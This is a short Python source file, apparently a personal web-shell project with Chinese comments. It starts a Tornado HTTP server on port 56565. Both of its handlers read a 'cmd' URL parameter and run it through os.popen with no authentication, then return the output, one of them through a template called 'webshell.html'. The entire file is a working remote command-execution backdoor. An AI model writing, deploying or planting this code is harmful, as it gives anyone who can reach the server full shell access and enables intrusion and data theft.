import os
from tornado.web import RequestHandler,Application
from tornado.ioloop import IOLoop
from tornado.options import options,parse_command_line,define
from tornado.httpserver import HTTPServer

#定义端口变量
define('port',default=56565,help="this is port")

#定义一个试图

class indexHadler(RequestHandler):
    def get(self):
        #这里接收来自get的参数
        cmd = self.get_query_argument('cmd','')
        run = self.get_query_argument('run','')
        #在自处执行命令
        res =os.popen(cmd,'r')
        self.render('view/webshell.html',result=res.read())
        # self.write(res.read())

class cmdHandler(RequestHandler):
    def get(self):
        #接受url中的数据，并返回cmd执行的结果
        cmd = self.get_query_argument('cmd','')
        if cmd:
            res = os.popen(cmd,'r')
            res = res.read()
            self.write(res)
            # self.render('view/webshell.html',result=res.read())
        
        #返回数据
    

def makeApp():
    return Application([(r'/',indexHadler),(r'/cmd',cmdHandler)])

if __name__ == '__main__':
    #开始接收
    parse_command_line()
    #web应用
    app = makeApp()
    #将app部署到http服务器
    server = HTTPServer(app)
    #绑定配置-端口
    server.bind(options.port)
    #启动server
    server.start()
    #启动轮询
    IOLoop.current().start()   